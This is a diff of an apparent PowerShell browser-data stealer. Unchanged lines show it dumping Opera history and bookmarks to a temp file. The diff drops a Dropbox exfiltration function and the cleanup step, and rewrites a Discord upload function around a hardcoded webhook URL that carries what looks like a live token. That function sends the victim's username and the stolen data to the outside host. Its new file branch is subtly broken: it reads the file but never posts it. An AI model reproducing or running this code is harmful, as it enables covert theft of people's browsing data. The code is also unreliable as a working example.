@@ -46,57 +46,38 @@ Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.t
 
 Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
 
-# Upload output file to dropbox
-
-function DropBox-Upload {
-
-[CmdletBinding()]
-param (
-	
-[Parameter (Mandatory = $True, ValueFromPipeline = $True)]
-[Alias("f")]
-[string]$SourceFilePath
-) 
-$outputFile = Split-Path $SourceFilePath -leaf
-$TargetFilePath="/$outputFile"
-$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $db
-$headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-$headers.Add("Authorization", $authorization)
-$headers.Add("Dropbox-API-Arg", $arg)
-$headers.Add("Content-Type", 'application/octet-stream')
-Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
-}
-
-if (-not ([string]::IsNullOrEmpty($db))){DropBox-Upload -f $env:TMP\--BrowserData.txt}
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
 function Upload-Discord {
 
-[CmdletBinding()]
-param (
-    [parameter(Position=0,Mandatory=$False)]
-    [string]$file,
-    [parameter(Position=1,Mandatory=$False)]
-    [string]$text 
-)
-
-$hookurl = "$dc"
-
-$Body = @{
-  'username' = $env:username
-  'content' = $text
-}
-
-if (-not ([string]::IsNullOrEmpty($text))){
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
-
-if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
-}
-
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\--BrowserData.txt}
-
-
-############################################################################################################################################################
-RI $env:TEMP/--BrowserData.txt
+    [CmdletBinding()]
+    param (
+        [parameter(Position=0,Mandatory=$False)]
+        [string]$file,
+        [parameter(Position=1,Mandatory=$False)]
+        [string]$text 
+    )
+    
+    $hookurl = "https://discord.com/api/webhooks/1101079563959808120/UyOetgCEvbNqODpOAkCqzc2oiqHZA2bz85R2SqY52FhPxFFrsc34nsjdn-N_2X0VG6Ea"
+    
+    $Body = @{
+      'username' = $env:username
+      'content' = $text
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($text))){
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($file))){
+        $data = [IO.File]::ReadAllBytes($file)
+        $form = new-object System.Net.Http.FormUrlEncodedContent @{content=$text}
+        $client = new-object System.Net.Http.HttpClient
+        $client.DefaultRequestHeaders.Add("Authorization", "Bot <bot_token>")
+        $response = $client.PostAsync($hookurl, $form).Result
+        $content = [Text.Encoding]::UTF8.GetString($response.Content.ReadAsByteArrayAsync().Result)
+    }
+    }
+    
+    if (-not ([string]::IsNullOrEmpty($dc))){
+        Upload-Discord -file "$env:TMP/--BrowserData.txt" -text "Browser data"
+    }
+    
